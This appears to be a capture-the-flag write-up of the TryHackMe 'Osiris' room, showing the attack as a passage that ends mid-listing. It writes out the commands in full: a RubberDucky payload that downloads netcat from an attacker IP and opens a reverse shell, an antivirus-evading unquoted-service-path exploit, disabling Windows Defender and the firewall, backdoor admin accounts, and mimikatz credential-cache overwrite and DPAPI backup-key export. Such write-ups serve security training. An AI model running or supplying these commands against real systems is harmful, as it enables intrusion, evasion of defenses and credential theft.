
# TryHackMe(THM) - Osiris - WriteUp

> Austin Lai | October 1st, 2021

---

<!-- Description -->

[Room = TryHackMe(THM) - Osiris](https://tryhackme.com/room/osiris)

Difficulty: **INSANE**

The room is completed on Sept 17th, 2021

```text
Can you Quack it?
```

<!-- /Description -->

## Table of Contents

<!-- TOC -->

- [TryHackMe(THM) - Osiris - WriteUp](#tryhackmethm---osiris---writeup)
    - [Table of Contents](#table-of-contents)
    - [Task 1](#task-1)
    - [Let's Begin Here !!!](#lets-begin-here-)

<!-- /TOC -->

---

## Task 1

```markdown
As a final blow to Windcorp's security, you intend to hack the laptop of the CEO, Charlotte Johnson. You heard she has a boatload of Bitcoin, and those seem mighty tasty to you. But they have learned from the previous hacks and have introduced strict security measures.

However, you dropped a wifi RubberDucky on her driveway. Charlotte and her personal assistant Alcino, just drove up to her house and he picks up the bait as they enter the building. Sitting in your black van, just outside her house, you wait for them to plug in the RubberDucky (curiosity kills cats, remember?) and once you see the Ducky’s Wifi network pop up, you make a connection to the RubberDucky and are ready to send her a payload…

This is where your journey begins. Can you come up with a payload and get that sweet revshell? And if you do, can you bypass the tightened security? Remember, antivirus tools aren’t the sharpest tools in the shed, sometimes changing the code a little bit and recompiling the executable can bypass these simplest of detections.

As a final hint, remember that you have pwned their domain controller. You might need to revisit Ra or Ra2 to extract a key component to manage this task, you will need the keys to the kingdom... 

Info: To simulate the payload delivery, we have put up a TFTP-server on the target computer. Use that, to upload your RubberDucky-scripts.

Important: The TFTP server itself, any software or scripts you find regarding the RubberDucky is not a part of the challenge.

Also; remember you are deploying Ducky-script to a box with limited resources. Give it more time than you usually would, to finish the tasks.

The box will need about 5 minutes before it is fully operational.

Please do NOT post write-ups or stream solution until it has been out for at least two weeks. 

The official writeup, is password protected by Flag3
```

---

## Let's Begin Here !!!

As important information gathered from the above, there is TFTP server running and we are able to use RubberDuck scripts on the target computer.

As all ports are closed and we don't really have network access, hence unable to perform nmap scan and will be solely focus on the TFTP and RubberDuck to gain access on the target computer.

From the Windcorp and Ra2 machines, we know that Windows Defender is active; if we intend to use netcat, we will need to put into path that Windows Defenders (AppLocker) undetectable.

Usually path such as ` C:\Windows\Tasks ` or ` C:\Windows\temp ` can be used to bypass AppLocker.

Below is the RubberDucky scripts we used to download the netcat executable from our attacker machine.

```text
REM The next three lines execute a command prompt in Windows
DELAY 500
GUI r
DELAY 500
STRING powershell -W hidden
ENTER
DELAY 1000
ENTER
STRING Invoke-WebRequest http://10.4.2.85/nc64.exe -outfile c:\windows\temp\nc64.exe
ENTER
DELAY 1000
STRING c:\windows\temp\nc64.exe 10.4.2.85 17777 -e cmd
ENTER
```

We will spin up python web server on the folder with netcat executable using command below:

```
python -m http.server 80
```

Leveraging powershell ` Invoke-WebRequest ` module to download netcat executable within the RubberDucky script.

Once the netcat executable is downloaded, the RubberDucky script will execute command to start netcat connection with specifying shell as cmd.

Of course, we will need to spin up netcat listener on our attacker machine prior to that.

And voila, we have our reverse shell access and we perform basic directories enumeration and found our Flag 1 on the ` C:\Users\alcres\Desktop `.

```dos
C:\Users\alcrez>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\Users\alcrez

09/16/2020  12:01 PM    <DIR>          .
09/16/2020  12:01 PM    <DIR>          ..
09/21/2020  09:29 AM    <DIR>          .ssh
09/11/2020  12:59 PM    <DIR>          3D Objects
09/11/2020  01:07 PM    <DIR>          Anaconda3
09/11/2020  12:59 PM    <DIR>          Contacts
09/19/2020  01:34 AM    <DIR>          Desktop
09/11/2020  03:10 PM    <DIR>          Documents
09/16/2020  12:15 PM    <DIR>          Downloads
09/11/2020  12:59 PM    <DIR>          Favorites
09/11/2020  12:59 PM    <DIR>          Links
09/11/2020  12:59 PM    <DIR>          Music
09/11/2020  01:16 PM    <DIR>          OneDrive
09/15/2020  12:18 PM    <DIR>          Pictures
09/11/2020  12:59 PM    <DIR>          Saved Games
09/11/2020  12:59 PM    <DIR>          Searches
09/18/2020  02:59 PM    <DIR>          Videos
09/16/2020  12:01 PM    <DIR>          your_destination
               0 File(s)              0 bytes
              18 Dir(s)  36,795,543,552 bytes free


C:\Users\alcrez>cd Desktop
cd Desktop


C:\Users\alcrez\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\Users\alcrez\Desktop

09/19/2020  01:34 AM    <DIR>          .
09/19/2020  01:34 AM    <DIR>          ..
09/19/2020  01:34 AM                45 Flag1.txt
09/16/2020  12:18 PM             1,034 Update VPN.lnk
               2 File(s)          1,079 bytes
               2 Dir(s)  36,795,543,552 bytes free
```

Beside the flag, there is one shortcut link on Desktop - ` Update VPN.lnk `, below is the content and based on that we enumerate through the information given on the shortcut.

```
C:\Users\alcrez\Desktop>type "Update VPN.lnk"
type "Update VPN.lnk"
L☺¶☻└F ¶ê⌐╓Yî╓☺╚
σ┘Yî╓☺§9║╓Yî╓☺Q½☺π¶▼PαO╨ Ω:i►ó+00¥↓/C:\T10Q┘ò►script>   ♦∩╛0Q┘ò0Q┘ò.WT☺
ûò|script▬`2Q0Q±ò update.vbsF   ♦∩╛0Q±ò0Q±ò.dn☺δ-5update.vbs→C∟☺∟-B◄♥3Nº▐►C:\script\update.vbs→..\..\..\script\update.vbs       C:\script!%SystemRoot%\System32\SHELL32.dll`♥áXosirisZZí█╖²▼Aè▬╬3Γ¼↓?¡Yô≈Ω◄¬╜
)▓ü?ZZí█╖²▼Aè▬╬3Γ¼↓?¡Yô≈Ω◄¬╜
)▓ü?ñ☺  áE1SPSφ0╜┌CëGº°╨‼ñsf")d▼
script (C:)┴1SPS0±%╖∩G→►Ñ±☻`î₧δ¼)
▼
update.vbs§@g∩╓Yî╓☺§
§Q=♦▼§VBScript Script File§@§9║╓Yî╓☺Y1SPSªjc(=ò╥◄╡╓└O┘↑╨=▲▼§C:\script\update.vbs91SPS▒▬mD¡ìpHºH@.ñ=xî↔hH÷A2ü0♥
C:\Users\alcrez\Desktop>



C:\Users\alcrez\Desktop>type C:\script\update.vbs
type C:\script\update.vbs
Set shell = CreateObject("WScript.Shell")
shell.LogEvent 4, "Update VPN profile"
C:\Users\alcrez\Desktop>



C:\Users\alcrez\Desktop>dir C:\script\
dir C:\script\
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of C:\script

09/16/2020  12:18 PM    <DIR>          .
09/16/2020  12:18 PM    <DIR>          ..
09/16/2020  12:17 PM               279 copyprofile.cmd
09/16/2020  11:47 AM                81 update.vbs
               2 File(s)            360 bytes
               2 Dir(s)  36,795,183,104 bytes free



C:\Users\alcrez\Desktop>type C:\script\copyprofile.cmd
type C:\script\copyprofile.cmd
powershell -c "Invoke-WebRequest https://vpn.windcorp.thm/profile.zip -outfile c:\temp\profile.zip"
powershell Expand-Archive c:\temp\profile.zip -DestinationPath c:\temp\
powershell -c "copy-Item -Path 'C:\Temp\*' -Destination 'C:\Program Files\IVPN Client' -Recurse -force"




C:\Users\alcrez\Desktop>
C:\Users\alcrez\Desktop>cd C:\script\
cd C:\script\
C:\script>cacls *
cacls *
C:\script\copyprofile.cmd BUILTIN\Administrators:(ID)F
                          NT AUTHORITY\SYSTEM:(ID)F
                          BUILTIN\Users:(ID)R
                          OSIRIS\scheduler:(ID)F

C:\script\update.vbs BUILTIN\Administrators:(ID)F
                     NT AUTHORITY\SYSTEM:(ID)F
                     BUILTIN\Users:(ID)R
                     OSIRIS\scheduler:(ID)F



C:\script>dir /s c:\temp\
dir /s c:\temp\
 Volume in drive C has no label.
 Volume Serial Number is DEA7-4E33

 Directory of c:\temp

11/22/2020  12:59 PM    <DIR>          .
11/22/2020  12:59 PM    <DIR>          ..
09/16/2020  11:55 AM    <DIR>          OpenVPN
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN

09/16/2020  11:55 AM    <DIR>          .
09/16/2020  11:55 AM    <DIR>          ..
09/16/2020  12:16 PM    <DIR>          x86_64
               0 File(s)              0 bytes

 Directory of c:\temp\OpenVPN\x86_64

09/16/2020  12:16 PM    <DIR>          .
09/16/2020  12:16 PM    <DIR>          ..
09/16/2020  12:16 PM             1,554 ca.crt
09/16/2020  12:16 PM             5,099 client1.crt
09/16/2020  12:16 PM             1,675 client1.key
09/16/2020  12:16 PM               247 IVPN-Singlehop-Canada-Toronto-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Canada-Toronto.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-France-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-France.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Germany-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Germany.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Hongkong-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Hongkong.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Iceland-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Iceland.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Netherlands-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Netherlands.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Romania-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Romania.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-Switzerland-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-Switzerland.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-UK-London-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-UK-London.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-Dallas-TX-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-Dallas-TX.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-Los-Angeles-CA-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-Los-Angeles-CA.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-New-Jersey-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-New-Jersey.conf
09/16/2020  12:16 PM               247 IVPN-Singlehop-USA-SaltLakeCity-UT-TCP-mode.conf
09/16/2020  12:16 PM               241 IVPN-Singlehop-USA-SaltLakeCity-UT.conf
09/16/2020  12:16 PM               636 ta.key
              30 File(s)         15,308 bytes

     Total Files Listed:
              30 File(s)         15,308 bytes
               8 Dir(s)  36,789,202,944 bytes free
```

From the enumeration, we know that the ` Update VPN.lnk ` is a shortcut to run ` update.vbs ` script in the ` C:\script\ ` folder.

And ` C:\script\ ` folder contain 2 files --- ` update.vbs ` and ` copyprofile.cmd `, these 2 files work together to perform below action.

The ` update.vbs ` only writes an event with ID 4 to the event log on the system.

However ` copyprofile.cmd ` does some interesting stuff, it started with download VPN profile as a zip file from ` vpn.windcorp.thm ` to ` C:\temp\ `, and then unzip it to the destination ` C:\Program Files\IVPN Client `.

We also notice a user called "scheduler" has full access to the 2 files in ` C:\scripts ` by using ` cacls * ` command.

Now we know there is ` IVPN Client ` is running, using powershell and command line from the reverse shell we have to check on the detail information of ` IVPN Client `

```powershell
PS C:\Temp> Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *
Get-WMIObject -Class Win32_Service -Filter "Name='ivpn client'" | select-object *


PSComputerName          : OSIRIS
Name                    : IVPN Client
Status                  : OK
ExitCode                : 0
DesktopInteract         : False
ErrorControl            : Normal
PathName                : C:\Program Files\IVPN
                          Client\IVPN Service.exe
ServiceType             : Own Process
StartMode               : Auto
__GENUS                 : 2
__CLASS                 : Win32_Service
__SUPERCLASS            : Win32_BaseService
__DYNASTY               : CIM_ManagedSystemElemen
                          t
__RELPATH               : Win32_Service.Name="IVP
                          N Client"
__PROPERTY_COUNT        : 26
__DERIVATION            : {Win32_BaseService,
                          CIM_Service,
                          CIM_LogicalElement, CIM
                          _ManagedSystemElement}
__SERVER                : OSIRIS
__NAMESPACE             : root\cimv2
__PATH                  : \\OSIRIS\root\cimv2:Win
                          32_Service.Name="IVPN
                          Client"
AcceptPause             : False
AcceptStop              : True
Caption                 : IVPN Client
CheckPoint              : 0
CreationClassName       : Win32_Service
DelayedAutoStart        : False
Description             :
DisplayName             : IVPN Client
InstallDate             :
ProcessId               : 2612
ServiceSpecificExitCode : 0
Started                 : True
StartName               : LocalSystem
State                   : Running
SystemCreationClassName : Win32_ComputerSystem
SystemName              : OSIRIS
TagId                   : 0
WaitHint                : 0
Scope                   : System.Management.Manag
                          ementScope
Path                    : \\OSIRIS\root\cimv2:Win
                          32_Service.Name="IVPN
                          Client"
Options                 : System.Management.Objec
                          tGetOptions
ClassPath               : \\OSIRIS\root\cimv2:Win
                          32_Service
Properties              : {AcceptPause,
                          AcceptStop, Caption,
                          CheckPoint...}
SystemProperties        : {__GENUS, __CLASS,
                          __SUPERCLASS,
                          __DYNASTY...}
Qualifiers              : {dynamic, Locale,
                          provider, UUID}
Site                    :
Container               :
```

Command line:

```dos
C:\Temp>sc qc "IVPN Client"
sc qc "IVPN Client"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: IVPN Client
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\IVPN Client\IVPN Service.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : IVPN Client
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

With the information above, we know that - there might be chances of unquoted service paths vulnerability and exploit available.

As we research on the exploit for unquoted service paths, we came across [this github link](https://github.com/mattymcfatty/unquotedPoC) that might be useful as it mentioned ` The payload is in SimpleService.Designer.cs. This is probably the "wrong" area, but it compiles and bypasses AV, so I don't really care `.

Which is what we wanted to bypass detections from Windows Defender.

We clone the project, and make a service that runs our custom Netcat that already resides in ` C:\Windows\temp\ ` .

As mentioned by the author from github, we are going to make a change on ` SimpleService.Designer.cs ` as the payload is there, checking on that will lead us to ` InitializeComponent() ` object; and we change the ` startinfo ` as below:

```
startInfo.Arguments = "/C \"C:\\Windows\\temp\\nc64.exe 10.4.2.85 17778 -e cmd\"";
```

To exploit the unquoted service path, our compiled new service needs to be named ` IVPN Service.exe ` and must be placed in ` C:\Program Files\IVPN Client\ `

For this we will need to create schedule task to disable Windows Defender (that can be found in [this github link](https://gist.github.com/tyranid/c65520160b61ec851e68811de3cd646d)) using powershell command below (note that we have to split into 2 parts as activate the schedule task require ` NT System ` privilege, that will be done later part):

```powershell
$cmdline = '/C sc.exe config windefend start= disabled && sc.exe sdset windefend D:(D;;GA;;;WD)(D;;GA;;;OW)'
$a = New-ScheduledTaskAction -Execute "cmd.exe" -Argument $cmdline
PS C:\Temp> Register-ScheduledTask -TaskName 'Meh' -Action $a
Register-ScheduledTask -TaskName 'Meh' -Action $a

TaskPath                                       Ta
                                               sk
                                               Na
                                               me
--------                                       --
\                                              Me
```

We will need to download the service executable we compiled and place it in ` C:\temp ` that can be used by the ` copyprofile.cmd ` to extract to ` C:\Program Files\IVPN Client ` using powershell command below:

```
Invoke-WebRequest "http://10.4.2.85/IVPN Service.exe" -outfile "C:\temp\IVPN Service.exe"
```

To activate the ` update.vbs `, we will first stop the ` IVPN Client ` service and activate ` update.vbs ` using command below:

```dos
C:\Temp>powershell -c "Get-Service -Name 'IVPN*' "


C:\Temp>powershell -c "Stop-Service -Name 'IVPN*' "

cscript C:\script\update.vbs
```

Then after a minutes or so, we can check the file is replaced using command below - take a note on the timestamp to know if the file is replaced; once replaced, we can start the service back again:

```dos

C:\Temp>dir "C:\Program Files\ivpn client\" | find "IVPN Service.exe"


C:\Temp>powershell -c "Restart-Service -Name 'IVPN*' "


C:\Temp>powershell -c "Get-Service -Name 'IVPN*' "
```

And of course, we will need to spin up netcat listener on our attacker machine prior to the above steps.

Once we get our reverse shell, we will have ` NT System ` privilege, time to activate the schedule task we created previously to disable Windows Defender by using powershell command below:

```powershell
$svc.Connect()
$user = 'NT SERVICE\TrustedInstaller'
$folder = $svc.GetFolder('\')
$task = $folder.GetTask('Meh')
$task.RunEx($null, 0, 0, $user)
```

Then we issue a restart command using ` shutdown /r /t 0 `, make sure you only RESTART otherwise you will lost the access !

Once the target computer is up, the reverse shell from ` IVPN Client ` will get back and we can use powershell command below to check if the Windows Defender has been disabled - if the response is error which mean Windows Defender is disabled:

```powershell
get-process -name "msmpeng"
```

Next we enumerate through the system again, this time we are able to access most of the directories as we are ` NT System `.

Check on ` C:\Users `, there is another user named ` chajoh `, under the Desktop folder, we have our Flag 2 !

```dos
C:\Users\chajoh\Desktop>type Flag2.txt
type Flag2.txt
```

Under the same user document folder - ` C:\Users\chajoh\Documents `, we found a KeePass database - ` Database.kdbx `

We can investigate the configuration file of KeePass in ` C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml `, and it reveals that KeePas is using the Windows users as MasterKey ( DPAPI ). So, we need to become that specific user to open it.

For now, we will need to get access to ` chajoh ` user, for this we will download mimikatz from our attacker machine to target computer and temporary inject our password to the user and TAKE A NOTE ON NTLM HASH.

Below is the command we used:

```text
Invoke-WebRequest "http://10.4.2.85/mimikatz.exe" -outfile "C:\temp\mimikatz.exe"



mimikatz # lsadump::cache /user:chajoh /password:hackP@ssw0rd /kiwi
> User cache replace mode !
  * user     : chajoh
  * password : hackP@ssw0rd
  * ntlm     : 4c05b64dec614df2b522c401bb8d8994

Domain : OSIRIS
SysKey : fb2f42c056c3a91c3f8892df313f2481

Local name : OSIRIS ( S-1-5-21-2412384816-2079449310-1594074140 )
Domain name : WINDCORP ( S-1-5-21-555431066-3599073733-176599750 )
Domain FQDN : windcorp.thm

Policy subsystem is : 1.18
LSA Key(s) : 1, default {04097fcd-7247-4e79-b35b-2a7d5fee2779}
  [00] {04097fcd-7247-4e79-b35b-2a7d5fee2779} 0d155c51e747c1119d69e11e96f37364aaaa190673e7ccb1321a931636b166c2

* Iteration is set to default (10240)

[NL$1 - 9/19/2020 1:38:15 AM]
RID       : 00000465 (1125)
User      : WINDCORP\chajoh
MsCacheV2 : f52542bb7f50df1b7bb0fd0ef1778781
> User cache replace mode (2)!
  MsCacheV2 : 8fe2d38a89462a0cbcd751aa5d7765bf
  Checksum  : fd6fd0aad85798ca9d29b5f9497d70d1
> OK!

[NL$2 - 9/12/2020 4:14:18 AM]
RID       : 0000168a (5770)
User      : WINDCORP\shelweb
MsCacheV2 : c5e541582794b0a92f813ec250f3a3a6

[NL$3 - 10/3/2020 1:19:49 AM]
RID       : 00000573 (1395)
User      : WINDCORP\alcrez
MsCacheV2 : d314d29973862ad7d8166ba7999cbf2d

mimikatz #
```

Next we will need to enable Remote Desktop Service and Disable NLA (Network Level Authentication) by adding registry key using command below:

```dos
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
```

Next we will perform below action to create persistent access to the target computer.

- Create user and add to local administrator group
- Add ` Everyone ` into ` Remote Desktop Users ` group
- Turn off Windows Firewall for all profile

Below is the command used for the above items:

```dos
net user hacker hackP@ssw0rd /add

net localgroup administrators hacker /add

net localgroup "Remote Desktop Users" Everyone /Add

netsh advfirewall set allprofiles state off
```

Next, we will need to logoff any existing Logon Session by using ` logoff Session_ID ` command as Windows only allow one logon session per computer unless otherwise configured.

We use ` query user ` command to check the Logon Session.

Once we Remote Desktop in (for our case, we use the user created above - hacker, rather than login as ` chajoh `), we try to open the KeePass however, it prompt error due to masterkey in DPAPI encrypted using user password.

And we overwrite ` chajoh ` password and the masterkey in DPAPI mis-matched !

We are unable to recovered it, hence we have to go back to the domain controller - ` Ra ` to get the DPAPI Backup Key.

We access back to ` Ra ` domain controller and upload mimikatz to the server, then we execute command below to export DPAPI key.

```
mimikatz # lsadump::backupkeys /system:localhost /export

Current prefered key:       {07ea03b4-3b28-4270-8862-0bc66dacef1a}
  * RSA key
        |Provider name : Microsoft Strong Cryptographic Provider
        |Unique name   :
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003f ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_EXPORT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : YES
        Private export : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.keyx.rsa.pvk'
        PFX container  : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx'
        Export         : OK - 'ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.der'

Compatibility prefered key: {887f3d05-3f50-4a1d-88c0-9a4b27e913c8}
  * Legacy key
92ce4fd5a55d6d7742135d325b09fd68aa0ad796fcc6eb2636663cec51a6b8fe
2a8933f4a98f7f97c303495d6579f83bd3678c65f9ffa28eca94e1d7f674bd33
90247312bf23dc6cd1ca1e1202748742dd0e80a48fb5579f5eeb4f461197f770
2033abcde34ca01f22cc5326089c1b14fbe95ef4431eabb475f7d910a53a18f9
11f0773bd40cf5382fdb0ea5c9e6fb12ad109fbd2195b71123ffc6bebd98ccfb
6034895425694257da9679081b9bc74aa0eeeaf68ace38df4bd26cf4d4100b6c
cf23bf6aef814bfcb824674b92fab623736d4f3187cbad2d0be6c893f191c8ea
eeec95d2cbe0a3149813bd02532a9f0f1f951755a7137060ffad541446333057

        Export         : OK - 'ntds_legacy_0_887f3d05-3f50-4a1d-88c0-9a4b27e913c8.key'

mimikatz #
```

Once done, we can upload all the file and key to target computer and also the 2 tools below from CQure to allow us re-create user DPAPI key.

- CQDPAPIBlobSearcher.exe
- CQMasterKeyAD.exe

First we will use ` CQDPAPIBlobSearcher.exe ` to search for KeePass masterkey.

```
C:\Users\chajoh\Desktop>CQDPAPIBlobSearcher.exe /d c:\users\chajoh\appdata\roaming /r /o c:\users\chajoh\Desktop
Scanning c:\users\chajoh\appdata\roaming\KeePass\KeePass.config.xml
Scanning c:\users\chajoh\appdata\roaming\KeePass\ProtectedUserKey.bin
Found 1 in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
98 9A 82 53 43 24 EC E4 F7 F5 3A 0A 19 53 C6 89   ...SC$....:..S..
49 86 2B 18 F2 A2 01 C9 50 0E 0B 2B DC A4 1E 46   I.+.....P..+...F
C1 50 25 DC 99 B3 F7 3E B5 01 85 51 AB D9 C6 1D   .P%....>...Q....
EC 6A 9A B8 A6 98 93 DB 8A F8 6F 1B 17 E7 02 25   .j........o....%
64 95 95 8B CD 2C CD DB                           d....,..
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
Found 2 in c:\users\chajoh\appdata\roaming\microsoft\crypto\keys\de7cf8a7901d2ad13e5c67c29e5d1662_b77306f1-b261-48a9-a448-d1f57a99cfde
 description:          Private Key Properties
 mkguid:               575c62b8-287f-4dae-97ac-7bbe50c995fc
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
D1 4D 84 A7 84 AB F6 08 71 E7 28 38 E6 50 6A 94   .M......q.(8.Pj.
EA 1D 6B B5 A1 11 AA B2 7A E8 31 97 D8 E5 39 C7   ..k.....z.1...9.
80 08 8B C1 3E 2C 1E 4C 66 49 70 AC 35 44 31 AC   ....>,.LfIp.5D1.
D7 81 BD DD 25 A8 99 56                           ....%..V
 description:          Private Key
 mkguid:               575c62b8-287f-4dae-97ac-7bbe50c995fc
 flags:                0x0
 hashAlgo:             0x8004 (SHA1)
 cipherAlgo:           0x6603 (3DES)
 cipherText:
6E 8D B6 A9 58 3C CF D5 14 BA 89 7B 98 C6 33 84   n...X<.....{..3.
12 A6 9A F2 59 8D 51 E4 4E 0D DA EE 54 E0 1A 4E   ....Y.Q.N...T..N
E9 EC 1C 5D BE D4 DB 0F 4A AC ED 93 62 5E 42 3E   ...]....J...b^B>
A3 AA 2C 61 66 5E 94 A8 BC 88 3C B7 3E C1 B2 BB   ..,af^....<.>...
B0 D4 ED B2 56 FE 7A 35 F3 EC 1F 61 B9 1F FA CD   ....V.z5...a....
0D 21 C4 DD AE 75 5C FB 64 62 89 AE 45 C5 E0 AC   .!...u\.db..E...
BB EC B1 48 D5 24 C8 9B 9F 6A 61 AE 09 CC E5 6D   ...H.$...ja....m
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Microsoft Edge.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Shows Desktop.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\Window Switcher.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\File Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\MMC\eventvwr
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Network\Connections\Pbk\_hiddenPbk\rasphone.pbk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\CREDHIST
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\SYNCHIST
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\575c62b8-287f-4dae-97ac-7bbe50c995fc
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\BK-WINDCORP
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\Preferred
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.acl
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.dic
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Spelling\en-US\default.exc
Scanning c:\users\chajoh\appdata\roaming\Microsoft\SystemCertificates\My\AppContainerUserCertRead
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\AccountPictures\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\CameraRoll.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Documents.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Music.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Pictures.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\SavedPictures.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Libraries\Videos.library-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database.kdbx.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\Database2.kdbx.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\The Internet.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts (2).lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\User Accounts.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\5f7b5f1e01b83767.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\7e4dca80246863e3.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\ccba5a5986c77e43.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\d97efdf3888fe7eb.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\AutomaticDestinations\f01b4d95cf55d32a.automaticDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\4ac866364817f10c.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\7e4dca80246863e3.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\9d1f905ce5044aee.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\ccba5a5986c77e43.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f01b4d95cf55d32a.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Recent\CustomDestinations\f18460fded109990.customDestinations-ms
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Bluetooth File Transfer.LNK
